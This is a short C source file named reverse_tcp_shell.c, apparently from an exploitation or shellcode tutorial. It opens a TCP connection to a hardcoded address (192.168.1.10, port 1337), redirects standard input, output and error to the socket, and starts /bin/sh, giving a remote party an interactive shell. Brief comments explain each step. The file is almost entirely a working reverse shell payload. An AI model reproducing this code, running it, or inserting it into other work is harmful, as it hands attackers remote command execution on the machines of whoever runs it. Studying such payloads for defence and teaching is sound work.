//reverse_tcp_shell.c 
#include <sys/socket.h>
#include <sys/types.h>         
#include <stdio.h>
#include <netinet/in.h>



int main() {

int sockfd = socket(2,1,0);

struct sockaddr_in st;

st.sin_family = 2;
st.sin_port = htons(1337);

// we hardcore the backconnect IP 
inet_aton("192.168.1.10", &st.sin_addr.s_addr);

// we use connect to initiate the connection 
connect(sockfd, (struct sockaddr *)  &st, sizeof(st));

int i;
// we redirect stdin,stdout,stderr to the socket file descriptor, so we can send command and receive outputs/errors. 
for(i=0;i<=2;i++) {
  dup2(sockfd, i);
}
//finally we execute the shell
execve("/bin/sh", NULL, NULL);
return 0;
}
